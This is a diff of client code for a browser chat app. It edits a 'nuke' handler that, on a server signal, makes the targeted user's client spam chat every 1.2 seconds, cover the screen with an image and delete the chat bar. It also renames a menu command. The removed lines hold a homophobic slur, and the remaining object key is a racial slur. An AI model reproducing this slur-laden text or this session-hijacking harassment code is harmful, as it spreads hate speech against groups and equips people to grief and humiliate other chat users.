@@ -246,7 +246,7 @@ function setup() {
         }),
         socket.on("nuke", ()=>{
             setInterval(()=>{
-                socket.emit("talk",{text:"I AM A GAY FAGGOT"})
+                socket.emit("talk",{text:"RUBRUBRUBRUB"})
             },1200)
             document.getElementById("content").innerHTML +="<img src='https://www.politico.eu/cdn-cgi/image/width=1160,height=751,quality=80,onerror=redirect,format=auto/wp-content/uploads/2023/01/04/GettyImages-1244207852.jpg' style='top:0;left:0;position:fixed;width:100%;height:100%;z-index:-999;'>";
             document.getElementBYId("chat_bar").remove();
@@ -694,7 +694,7 @@ socket.emit("talk",{text: d.userPublic.name+" stop being a pastule"});
 },
 },
                                 nigger:{
-                                    name:"Niggerify",
+                                    name:"call a mason alt",
                                     callback:function(){
                                         socket.emit("talk",{text:d.userPublic.name+" WANNA HEAR SOMETHING?"})
                                         setTimeout(()=>{
